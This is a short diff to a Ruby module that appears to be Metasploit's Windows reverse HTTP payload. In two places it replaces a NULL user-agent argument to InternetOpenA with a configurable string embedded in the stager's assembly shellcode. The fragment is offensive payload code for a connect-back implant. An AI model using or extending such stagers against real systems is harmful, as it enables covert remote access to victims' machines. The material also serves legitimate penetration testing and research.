@@ -265,7 +265,10 @@ module Payload::Windows::ReverseHttp
       get_proxy_server:
                                ; LPCTSTR lpszProxyName (via call)
         push 3                 ; DWORD dwAccessType (INTERNET_OPEN_TYPE_PROXY = 3)
-        push ebx               ; LPCTSTR lpszAgent (NULL)
+      call get_useragent
+        db "#{opts[:ua]}", 0x00
+                               ; LPCTSTR lpszAgent (via call)
+      get_useragent:
         push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
         call ebp
       ^
@@ -276,7 +279,10 @@ module Payload::Windows::ReverseHttp
         push ebx               ; LPCTSTR lpszProxyBypass (NULL)
         push ebx               ; LPCTSTR lpszProxyName (NULL)
         push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
-        push ebx               ; LPCTSTR lpszAgent (NULL)
+      call get_useragent
+        db "#{opts[:ua]}", 0x00
+                               ; LPCTSTR lpszAgent (via call)
+      get_useragent:
         push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
         call ebp
       ^
